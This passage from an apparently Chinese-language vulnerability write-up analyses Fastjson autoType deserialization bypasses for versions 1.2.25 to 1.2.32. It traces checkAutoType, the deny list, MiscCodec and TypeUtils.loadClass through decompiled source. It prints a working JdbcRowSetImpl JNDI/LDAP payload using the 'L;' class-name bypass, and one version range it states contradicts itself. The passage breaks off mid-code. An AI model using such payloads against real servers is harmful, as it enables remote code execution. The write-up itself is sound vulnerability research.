src="/image/image-20220908094528661-16626015314011.png" alt="image-20220908094528661"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>    String accept;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denyList.length; ++i) &#123;<br>        accept = <span class="hljs-built_in">this</span>.denyList[i];<br>        <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.acceptList.length; ++i) &#123;<br>        accept = <span class="hljs-built_in">this</span>.acceptList[i];<br>        <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alibaba.fastjson.util.TypeUtils#loadClass()中对[ L ;进行了处理，而其中在处理L ;的时候存在了逻辑漏洞，可以在className的前后分别加上L ;来进行绕过</p><p><img src="/image/image-20220908111904169-166260714586611.png" alt="image-20220908111904169"></p><h5 id="PAYLOAD-2"><a href="#PAYLOAD-2" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="PAYLOAD2"><a href="#PAYLOAD2" class="headerlink" title="PAYLOAD2"></a>PAYLOAD2</h4><h5 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</p><p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32  autoTypeSupport开启或未开启均可利用</p><h5 id="利用链分析：-3"><a href="#利用链分析：-3" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>ParserConfig#checkAutoType()方法中若autoTypeSupport为false,则会运行到Class&lt;?&gt; clazz &#x3D; TypeUtils.getClassFromMapping(typeName);若clazz为空则会运行clazz &#x3D; this.deserializers.findClass(typeName);其中deserializers当类初始化时会添加数据，若目标类在ParserConfig类初始化添加类map中，则checkAutoType()方法可return目标类：具体如下</p><p><img src="/image/image-20220908155129860.png" alt="image-20220908155129860"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">ParserConfig</span><span class="hljs-params">(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader)</span> &#123;<br>    <span class="hljs-built_in">this</span>.deserializers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IdentityHashMap</span>();<br>    <span class="hljs-built_in">this</span>.asmEnable = !ASMUtils.IS_ANDROID;<br>    <span class="hljs-built_in">this</span>.symbolTable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SymbolTable</span>(<span class="hljs-number">4096</span>);<br>    <span class="hljs-built_in">this</span>.autoTypeSupport = AUTO_SUPPORT;<br>    <span class="hljs-built_in">this</span>.denyList = <span class="hljs-string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="hljs-string">&quot;,&quot;</span>);<br>    <span class="hljs-built_in">this</span>.acceptList = AUTO_TYPE_ACCEPT_LIST;<br>    <span class="hljs-keyword">if</span> (asmFactory == <span class="hljs-literal">null</span> &amp;&amp; !ASMUtils.IS_ANDROID) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (parentClassLoader == <span class="hljs-literal">null</span>) &#123;<br>                asmFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMDeserializerFactory</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMClassLoader</span>());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                asmFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMDeserializerFactory</span>(parentClassLoader);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ExceptionInInitializerError var4) &#123;<br>        &#125; <span class="hljs-keyword">catch</span> (AccessControlException var5) &#123;<br>        &#125; <span class="hljs-keyword">catch</span> (NoClassDefFoundError var6) &#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.asmFactory = asmFactory;<br>    <span class="hljs-keyword">if</span> (asmFactory == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.asmEnable = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//deserializerst添加类</span><br>    <span class="hljs-built_in">this</span>.deserializers.put(SimpleDateFormat.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Timestamp.class, SqlDateDeserializer.instance_timestamp);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Date.class, SqlDateDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Time.class, TimeDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(java.util.Date.class, DateCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Calendar.class, CalendarCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONObject.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONArray.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Map.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(HashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(LinkedHashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(TreeMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ConcurrentMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Collection.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(List.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ArrayList.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Object.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(String.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StringBuffer.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StringBuilder.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Character.TYPE, CharacterCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Character.class, CharacterCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Byte.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Byte.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Short.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Short.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Integer.TYPE, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Integer.class, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Long.TYPE, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Long.class, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(BigInteger.class, BigIntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(BigDecimal.class, BigDecimalCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Float.TYPE, FloatCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Float.class, FloatCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Double.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Double.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Boolean.TYPE, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Boolean.class, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Class.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(<span class="hljs-type">char</span>[].class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharArrayCodec</span>());<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicBoolean.class, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicInteger.class, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicLong.class, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(WeakReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(SoftReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(UUID.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(TimeZone.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Locale.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Currency.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(InetAddress.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Inet4Address.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Inet6Address.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(InetSocketAddress.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(File.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(URI.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(URL.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Pattern.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Charset.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONPath.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Number.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicLongArray.class, AtomicCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Serializable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Comparable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Closeable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.addItemsToDeny(DENYS);<br>    <span class="hljs-built_in">this</span>.addItemsToAccept(AUTO_TYPE_ACCEPT_LIST);<br>&#125;<br></code></pre></td></tr></table></figure><p>代码继续运行，运行到thisObj &#x3D; deserializer.deserialze(this, clazz, fieldName);进入到MiscCodec#deserialze()方法</p><p><img src="/image/image-20220909104428239-16626914698001.png" alt="image-20220909104428239"></p><p>MiscCodec#deserialze()方法，取出JSON串中var值，然后执行TypeUtils.loadClass(),具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;<br>    <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> parser.lexer;<br>    String className;<br>    <span class="hljs-keyword">if</span> (clazz == InetSocketAddress.class) &#123;<span class="hljs-comment">//判断clazz 是否为InetSocketAddress.class</span><br>......<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object objVal;<br>        <span class="hljs-keyword">if</span> (parser.resolveStatus == <span class="hljs-number">2</span>) &#123;<br>            parser.resolveStatus = <span class="hljs-number">0</span>;<br>            parser.accept(<span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">if</span> (lexer.token() != <span class="hljs-number">4</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br><span class="hljs-comment">//判断val值，若不为则抛出异常</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br><br>            lexer.nextToken();<br>            parser.accept(<span class="hljs-number">17</span>);<br>            objVal = parser.parse();<br>            parser.accept(<span class="hljs-number">13</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            objVal = parser.parse();<br>        &#125;<br><br>        String strVal;<br>        <span class="hljs-keyword">if</span> (objVal == <span class="hljs-literal">null</span>) &#123;<br>            strVal = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(objVal <span class="hljs-keyword">instanceof</span> String)) &#123;<br>                <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> JSONObject &amp;&amp; clazz == Map.Entry.class) &#123;<br>                    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> (JSONObject)objVal;<br>                    <span class="hljs-keyword">return</span> jsonObject.entrySet().iterator().next();<br>                &#125;<br><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;expect string&quot;</span>);<br>            &#125;<br><br>            strVal = (String)objVal;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (strVal != <span class="hljs-literal">null</span> &amp;&amp; strVal.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (clazz == UUID.class) &#123;<br>                <span class="hljs-keyword">return</span> UUID.fromString(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == URI.class) &#123;<br>                <span class="hljs-keyword">return</span> URI.create(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == URL.class) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(strVal);<br>                &#125; <span class="hljs-keyword">catch</span> (MalformedURLException var9) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;create url error&quot;</span>, var9);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Pattern.class) &#123;<br>                <span class="hljs-keyword">return</span> Pattern.compile(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Locale.class) &#123;<br>                String[] items = strVal.split(<span class="hljs-string">&quot;_&quot;</span>);<br>                <span class="hljs-keyword">if</span> (items.length == <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>]);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> items.length == <span class="hljs-number">2</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>], items[<span class="hljs-number">1</span>]) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>], items[<span class="hljs-number">1</span>], items[<span class="hljs-number">2</span>]);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == SimpleDateFormat.class) &#123;<br>                <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">dateFormat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(strVal, lexer.getLocale());<br>                dateFormat.setTimeZone(lexer.getTimeZone());<br>                <span class="hljs-keyword">return</span> dateFormat;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;<br>                <span class="hljs-keyword">if</span> (clazz == File.class) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(strVal);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == TimeZone.class) &#123;<br>                    <span class="hljs-keyword">return</span> TimeZone.getTimeZone(strVal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (clazz <span class="hljs-keyword">instanceof</span> ParameterizedType) &#123;<br>                        <span class="hljs-type">ParameterizedType</span> <span class="hljs-variable">parmeterizedType</span> <span class="hljs-operator">=</span> (ParameterizedType)clazz;<br>                        clazz = parmeterizedType.getRawType();<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz == Class.class) &#123; <span class="hljs-comment">//当clazz == Class.class，调用TypeUtils.loadClass(),此时strVal为val对应值</span><br>                        <span class="hljs-keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Charset.class) &#123;<br>                        <span class="hljs-keyword">return</span> Charset.forName(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Currency.class) &#123;<br>                        <span class="hljs-keyword">return</span> Currency.getInstance(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSONPath.class) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONPath</span>(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>.........<br></code></pre></td></tr></table></figure><p>进入到TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())，会对传过来的类名字符串在mappings找对应的缓存类对象，如果没有就加载对象，并添加到 mappings 缓存起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;<br>    <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; className.length() != <span class="hljs-number">0</span>) &#123;<br>        Class&lt;?&gt; clazz = (Class)mappings.get(className);<span class="hljs-comment">//从map中获取classname</span><br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<span class="hljs-comment">//判断classname是否[开头</span><br>            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>            <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<span class="hljs-comment">//判断classname是否L开头</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<span class="hljs-comment">//去除classname中开头的L</span><br>            <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<span class="hljs-comment">//重新调用loadClass()</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (classLoader != <span class="hljs-literal">null</span>) &#123;<br>                    clazz = 